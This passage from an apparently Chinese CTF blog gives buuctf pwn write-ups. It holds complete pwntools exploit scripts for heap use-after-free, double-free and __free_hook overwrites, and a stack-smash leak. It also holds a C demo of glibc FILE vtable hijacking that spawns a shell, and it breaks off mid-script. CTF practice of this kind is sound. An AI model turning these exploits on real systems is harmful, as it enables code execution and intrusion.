fp-&gt;_wide_data-&gt;_IO_backup_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;libc_hidden_def (_IO_switch_to_wget_mode)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在这里调用WOVERFLOW函数指针。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;总结一下这条路径需要的构造条件：\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;A. FILE-&gt;_mode &gt; 0 (_IO_flush_all_lockp 控制流判断条件，__wunderflow 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;B. FILE-&gt;_wide_data-&gt;_IO_write_ptr &gt; FILE-&gt;_wide_data-&gt;_IO_write_base (_IO_flush_all_lockp 控制流判断条件，_IO_switch_to_wget_mode 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;C. rdx != 0 (_IO_wdefault_xsgetn 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;D. FILE-&gt;_wide_data-&gt;_IO_read_end - FILE-&gt;_wide_data-&gt;_IO_read_ptr &lt;= 0 (_IO_wdefault_xsgetn 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;E. FILE-&gt;_flags &amp; 0x800 != 0 (__wunderflow 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;F. FILE-&gt;_wide_data-&gt;_wide_vtable + 0x18 == 要执行的代码地址 (OVERFLOW函数指针偏移0x18)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> exploit_mode == 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// (/libio/genops.c, line 701): fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x2160C0</span>; <span class="comment">// vtable, 0x215F40, 0x216000</span></span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x18</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> exploit_mode == 2</span></span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_read_end = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x216000</span>; <span class="comment">// vtable</span></span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> exploit_mode == 3</span></span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215AC0</span> + <span class="number">0x28</span>; <span class="comment">// vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x20</span> / <span class="number">8</span>] = <span class="number">1</span>;     <span class="comment">// _wide_data-&gt;_IO_write_ptr, o+0x20</span></span><br><span class="line">    fake_vtable[<span class="number">0x18</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WOVERFLOW调用的函数指针</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh2);       <span class="comment">// sh =&gt; 0x6873, 0x6873 &amp; 0x800 != 0</span></span><br><span class="line"></span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/06/buuctf-pwn-write-ups-12/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/06/buuctf-pwn-write-ups-12/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (12)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-06 20:49:16" itemprop="dateCreated datePublished" datetime="2023-03-06T20:49:16+08:00">2023-03-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-11 20:44:05" itemprop="dateModified" datetime="2023-03-11T20:44:05+08:00">2023-03-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu093-wustctf2020_easyfast"><a class="markdownIt-Anchor" href="#buu093-wustctf2020_easyfast"></a> buu093-wustctf2020_easyfast</h1>
<p>Ubuntu 16.04下的简单堆题，使用fastbin直接UAF，分配到关键位置，注意前面有一个0x50表示chunk的大小，如果这个值不存在，那么这里是无法分配chunk的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28773</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice&gt;\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;size&gt;\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice&gt;\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;index&gt;\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writein</span>(<span class="params">index, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice&gt;\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;index&gt;\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	time.sleep(<span class="number">0.1</span>)</span><br><span class="line">	io.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">writein(<span class="number">0</span>, p64(<span class="number">0x602080</span>))</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">writein(<span class="number">2</span>, p64(<span class="number">0</span>))</span><br><span class="line">sla(<span class="string">b&#x27;choice&gt;\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu094-ciscn_2019_es_1"><a class="markdownIt-Anchor" href="#buu094-ciscn_2019_es_1"></a> buu094-ciscn_2019_es_1</h1>
<p>这道题虽然说的是“hate libc 2.29”，但实际上最后发现用的还是glibc 2.27-3ubuntu1版本，也就是能够double free的版本。本题想要获取libc地址很简单，因为free之后地址还在，只要add一个大于0x400的chunk，释放后再show一下即可获取。然后double free一个小chunk，以将chunk分配到__free_hook。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_2019_es_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28589</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, name, phone</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input the size of compary\&#x27;s name\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	sla(<span class="string">b&#x27;please input name:\n&#x27;</span>, name)</span><br><span class="line">	sla(<span class="string">b&#x27;please input compary call:\n&#x27;</span>, phone)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input the index:\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input the index:\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">96</span></span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">log.info(<span class="string">&#x27;__malloc_hook: &#x27;</span> + <span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>, __malloc_hook)</span><br><span class="line">base = __malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line">log.info(<span class="string">&#x27;system: &#x27;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">__free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;b&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;b&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, p64(__free_hook), <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;b&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>, p64(system), <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu095-wdb2018_guess"><a class="markdownIt-Anchor" href="#buu095-wdb2018_guess"></a> buu095-wdb2018_guess</h1>
<p>这道题的解法需要使用glibc 2.23下的<code>__stack_chk_fail</code>函数。在2.23中，<code>__stack_chk_fail</code>的函数定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__attribute__ ((<span class="keyword">noreturn</span>)) internal_function</span><br><span class="line">__fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">		    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>
<p>这是函数<code>__stack_chk_fail</code>直接调用的函数，可以看到这里会打印出<code>argv[0]</code>的内容，这个值在调试过程中会保存到r13寄存器的位置。且一般在栈的顶部位置。这个地址与我们通过gets写入字符串的地址的偏移是固定的，因此第一次我们可以通过将这个值修改为got表地址，来获取到libc的加载地址；第二次我们将其修改为<code>environ</code>变量的值，这个变量位于libc中，保存着栈地址；在获取了栈地址之后，第三次我们就可以将其修改为flag的内容，然后就可以输出了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./GUESS&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28148</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./GUESS&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please type your guessing flag\n&#x27;</span>, cyclic(<span class="number">0x128</span>) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">base = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line">environ = base + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;environ: &#x27;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please type your guessing flag\n&#x27;</span>, cyclic(<span class="number">0x128</span>) + p64(environ))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">stack_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">flag_addr = stack_addr - <span class="number">0x168</span></span><br><span class="line">log.info(<span class="string">&#x27;stack address: &#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please type your guessing flag\n&#x27;</span>, cyclic(<span class="number">0x128</span>) + p64(flag_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu096-gyctf_2020_some_thing_exceting"><a class="markdownIt-Anchor" href="#buu096-gyctf_2020_some_thing_exceting"></a> buu096-gyctf_2020_some_thing_exceting</h1>
<p>这道题做的时候大意了，做着做着给flag已经被读到内存这件事给忘了……</p>
<p>在flag已经读入内存的情况下，这道题是很简单的，就是一个基础的堆排布，让0x10的header分配到可以写的buffer里面，直接修改指针的值然后show就行了。</p>
<p>如果这道题没有flag在内存中，首先就应该通过上面的这种方法获取libc基址，然后使用fastbin attack，用一次double free分配到<code>__malloc_hook</code>，注意修改指针的值应该是<code>__malloc_hook - 0x23</code>，原因参见我的这篇文章：<a target="_blank" rel="noopener" href="https://hornos3.github.io/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-3/">传送门</a></p>
<p>注意这里不能分配到<code>__free_hook</code>，因为fastbin分配之前会检查size字段，而<code>__free_hook</code>前面并不存在有效的size字段。然后将<code>__malloc_hook</code>改成one_gadget，可惜测试完发现4个one_gadget都不行，于是开始怀疑人生，然后突然就意识到flag在内存中本来就有……</p>
<p>下面的代码注释掉的部分就是不存在flag时的利用方式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27127</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">basize, nasize, bacon, nacon</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;&gt; Now please tell me what you want to do :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;&gt; ba\&#x27;s length : &#x27;</span>, <span class="built_in">str</span>(basize).encode())</span><br><span class="line">	sa(<span class="string">b&#x27;&gt; ba : &#x27;</span>, bacon)</span><br><span class="line">	sla(<span class="string">b&#x27;&gt; na\&#x27;s length : &#x27;</span>, <span class="built_in">str</span>(nasize).encode())</span><br><span class="line">	sa(<span class="string">b&#x27;&gt; na : &#x27;</span>, nacon)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;&gt; Now please tell me what you want to do :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;&gt; Banana ID : &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">	</span><br><span class="line"><span 